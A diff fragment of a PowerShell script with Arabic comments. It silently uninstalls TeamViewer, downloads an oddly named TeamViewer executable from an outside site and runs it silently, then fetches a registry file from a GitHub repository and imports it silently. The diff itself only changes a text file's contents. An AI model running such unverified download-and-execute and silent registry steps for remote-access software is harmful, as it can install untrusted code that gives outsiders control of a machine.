@@ -16,7 +16,7 @@ Start-Process -Filepath "C:\Program Files (x86)\TeamViewer\uninstall.exe"/S
 (New-Object Net.WebClient).DownloadFile('https://osaid.info/eamViewer_Host_Setup_x64.exe', 'C:\Temp\packageq1.exe')
 C:\Temp\packageq1.exe /S 
 Stop-Process -Name "TeamViewer" -Force
-New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hello World!" -Force
+New-Item -ItemType File -Path C:\Temp\newfile.txt -Value "Hi soso" -Force
 # تحميل ملف من الإنترنت
 $url = "https://raw.githubusercontent.com/defeat11/sav2/main/Teamvwier.reg"
 $outputPath = "C:\Temp\reg.reg"
@@ -29,4 +29,4 @@ Start-Process regedit -ArgumentList "/s $RegFilePath" -Wait
 # إيقاف تشغيل TeamViewer
 Stop-Process -Name "TeamViewer" -Force
 
-a
+
